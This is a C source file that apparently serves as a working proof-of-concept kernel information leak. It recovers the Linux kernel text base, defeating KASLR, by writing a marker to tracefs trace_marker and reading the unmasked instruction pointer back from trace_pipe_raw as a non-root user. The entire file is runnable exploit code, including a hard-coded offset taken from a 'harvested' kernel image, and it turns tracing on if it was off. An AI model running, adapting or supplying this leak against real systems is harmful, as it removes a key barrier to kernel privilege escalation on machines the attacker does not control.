// kaslr_marker.c — unprivileged kernel-text-base leak via tracefs.
// Writing to trace_marker stores tracing_mark_write's own code address
// (_THIS_IP_ = tracing_mark_write+0x164) into the ring-buffer print_entry.ip
// at offset +8. A RAW read of trace_pipe_raw returns it unmasked (kptr_restrict
// only affects %pK, and this never passes a %p formatter).
//   text_base = leaked_ip - 0x1f0ac8      (offset derived from the harvested Image)
// Runs as plain shell (gid readtracefs). No root, no bug, cannot panic.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>

#define IP_TO_TEXT_OFF 0x1f0ac8ULL   // tracing_mark_write+0x164 - _text
#define MARK "KASLRPROBE_64468"

static void *memmem_(const void*h,size_t hl,const void*n,size_t nl){
    if(nl>hl) return NULL;
    for(size_t i=0;i+nl<=hl;i++) if(!memcmp((const char*)h+i,n,nl)) return (void*)((const char*)h+i);
    return NULL;
}

int main(void){
    cpu_set_t s; CPU_ZERO(&s); CPU_SET(0,&s); sched_setaffinity(0,sizeof s,&s);
    printf("uid=%d\n", getuid());

    int t = open("/sys/kernel/tracing/tracing_on", O_RDWR);
    if (t>=0){ char c='0'; if(read(t,&c,1)==1 && c=='0'){ lseek(t,0,SEEK_SET); if(write(t,"1",1)<0){} printf("tracing_on was 0, set to 1\n"); } }

    int r = open("/sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw", O_RDONLY|O_NONBLOCK);
    if (r<0){ perror("open trace_pipe_raw"); return 1; }
    unsigned char page[8192];
    // 1) DRAIN cpu0's existing (busy) buffer so our fresh marker lands on top.
    int drained=0; for(;;){ ssize_t d=read(r,page,sizeof page); if(d<=0) break; drained++; if(drained>4096) break; }

    int m = open("/sys/kernel/tracing/trace_marker", O_WRONLY);
    if (m<0){ perror("open trace_marker"); return 1; }
    if (write(m, MARK, strlen(MARK)) < 0){ perror("write marker"); return 1; }

    // 2) read fresh pages until our marker shows up.
    unsigned char *p=NULL; ssize_t n=0;
    for (int tries=0; tries<200 && !p; tries++){
        n = read(r, page, sizeof page);
        if (n<=0){ usleep(1000); continue; }
        p = memmem_(page, n, MARK, strlen(MARK));
    }
    if (!p){ printf("marker not found after draining %d old pages\n", drained); return 3; }
    printf("found marker (drained %d old pages, page=%zd bytes)\n", drained, n);
    uint64_t ip = *(uint64_t*)(p - 8);
    printf("leaked entry->ip = 0x%016llx  (low12=0x%03llx)\n",
           (unsigned long long)ip, (unsigned long long)(ip & 0xfff));
    if ((ip & 0xfff) != 0xac8)
        printf("WARN: low12 != 0xac8 -- ip may not be the marker's own\n");
    uint64_t base = ip - IP_TO_TEXT_OFF;
    printf("=> derived _text base = 0x%016llx\n", (unsigned long long)base);
    return 0;
}
